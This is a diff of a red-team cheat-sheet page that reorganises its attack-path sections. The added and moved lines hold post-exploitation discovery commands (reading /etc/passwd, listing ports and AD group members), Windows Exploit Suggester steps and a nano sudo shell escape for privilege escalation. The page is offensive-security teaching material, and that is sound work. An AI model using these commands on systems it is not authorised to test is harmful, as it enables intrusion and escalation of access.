@@ -35,30 +35,34 @@ This page will contain a high-level overview of general attack paths, vectors an
 * [Windows] Is IIS version < (insert version here)
 
 
+## Discovery (Post-Exploitation)
+
+* [[Linux] List local users](https://securitynoodle.github.io/RedTeam/AttackPathsAndCommands/#list-local-users)
+* [[Linux] Checking ports that are listening](https://securitynoodle.github.io/RedTeam/AttackPathsAndCommands/#checking-ports-that-are-listening)
+* [[Linux] Finding files owned by a specific user](https://securitynoodle.github.io/RedTeam/AttackPathsAndCommands/#finding-files-owned-by-a-specific-user)
+* [[Linux] Finding files owned by a specific group](https://securitynoodle.github.io/RedTeam/AttackPathsAndCommands/#finding-files-owned-by-a-specific-group)
+* [[Windows] Checking what groups a user is in](https://securitynoodle.github.io/RedTeam/AttackPathsAndCommands/#checking-what-groups-a-user-is-in)
+* [[Windows] Checking what users are in an Active Directory group](https://securitynoodle.github.io/RedTeam/AttackPathsAndCommands/#checking-what-users-are-in-an-active-directory-group)
+* [[Windows] Using windows exploit suggester](https://securitynoodle.github.io/RedTeam/AttackPathsAndCommands/#using-windows-exploit-suggester)
+
 ## Privilege Escalation
 
 * [[Linux] Checking sudo commands that do not require password](https://securitynoodle.github.io/RedTeam/AttackPathsAndCommands/#checking-sudo-commands-that-do-not-require-password)
 * [Windows] Is savecred allowed
 * [Windows] Is DNSAdmin 
 
-## Discovery
-
-* [[Linux] Checking ports that are listening](https://securitynoodle.github.io/RedTeam/AttackPathsAndCommands/#checking-ports-that-are-listening)
-* [[Linux] Finding files owned by a specific user](https://securitynoodle.github.io/RedTeam/AttackPathsAndCommands/#finding-files-owned-by-a-specific-user)
-* [[Linux] Finding files owned by a specific group](https://securitynoodle.github.io/RedTeam/AttackPathsAndCommands/#finding-files-owned-by-a-specific-group)
-* [[Windows] Checking what groups a user is in](https://securitynoodle.github.io/RedTeam/AttackPathsAndCommands/#checking-what-groups-a-user-is-in)
-* [[Windows] Checking what users are in an Active Directory group](https://securitynoodle.github.io/RedTeam/AttackPathsAndCommands/#checking-what-users-are-in-an-active-directory-group)
 
 ## Lateral Movement
 
 * [Windows] Using Mimikatz
 * [Windows] Using BloodHound
 
+
 ## Exfiltration and File Transferring
 
 * [Downloading files from FTP](https://securitynoodle.github.io/RedTeam/AttackPathsAndCommands/#downloading-files-from-ftp)
 
-## Post Exploitation 
+## Impact 
 
 <p align="center">
   <img src="https://user-images.githubusercontent.com/41026969/89838415-2cd50c00-db39-11ea-824b-8ef86b869974.png" />
@@ -215,34 +219,13 @@ Example's output:
 
 
 
-# Privilege Escalation Commands
+# Discovery (Post-Exploitation)
 
 
 
-### Checking sudo commands that do not require password
-`sudo -l`
-
-Example:
-![image](https://user-images.githubusercontent.com/41026969/92505030-76b12080-f1d1-11ea-96c3-c1a098649f32.png)
-
-In this example, you can see the user can run the command `sudo /bin/nano /opt/priv` as sudo without supplying a password.
-
-Nano can spawn a shell, and since it's running under sudo, it will spawn a shell as sudo [source here](https://gtfobins.github.io/gtfobins/nano/#shell).
-
-```
-nano
-^R^X
-reset; sh 1>&0 2>&0
-```
-<p align="center">
-  <img src="https://user-images.githubusercontent.com/41026969/89838415-2cd50c00-db39-11ea-824b-8ef86b869974.png" />
-</p>
-
-
-
-# Discovery
-
-
+### List local users
+`cat /etc/passwd`
+	* Checks the `/etc/passwd` file for the list of users that are present on the system
 
 ### Checking ports that are listening
 `netstat -tulp`
@@ -272,11 +255,46 @@ Example: `net user ryan /domain`
 Example: `Get-ADGroupMember Contractors | select name`
 * Gets all members of the `Contractors` AD group, then from that list only output the names.
 
+### Using windows exploit suggester
+1) On the windows shell do `systeminfo`, save output
+2) On the kali (attacker) system, do `python windows-exploit-suggester.py --update` (should get an xls or xlsx file)
+3) On the kali (attacker) system, do `pip install xlrd`
+4) On the kali (attacker) system, do `python windows-exploit-suggester.py --database <.xls file> --systeminfo <systeminfo file>` 
+
 <p align="center">
   <img src="https://user-images.githubusercontent.com/41026969/89838415-2cd50c00-db39-11ea-824b-8ef86b869974.png" />
 </p>
 
+
+
+# Privilege Escalation Commands
+
+
+
+### Checking sudo commands that do not require password
+`sudo -l`
+
+Example:
+![image](https://user-images.githubusercontent.com/41026969/92505030-76b12080-f1d1-11ea-96c3-c1a098649f32.png)
+
+In this example, you can see the user can run the command `sudo /bin/nano /opt/priv` as sudo without supplying a password.
+
+Nano can spawn a shell, and since it's running under sudo, it will spawn a shell as sudo [source here](https://gtfobins.github.io/gtfobins/nano/#shell).
+
+```
+nano
+^R^X
+reset; sh 1>&0 2>&0
+```
+<p align="center">
+  <img src="https://user-images.githubusercontent.com/41026969/89838415-2cd50c00-db39-11ea-824b-8ef86b869974.png" />
+</p>
+
+
+
 # Exfiltration and File Transferring Commands
+
+
 
 ### Downloading files from FTP
 ##### Note: it's important to distinguish if you need to utilize FTP's ASCII mode or Binary mode, examples of file types that should be used for each mode is listed below. When initially connected to FTP, ASCII mode is the default mode.
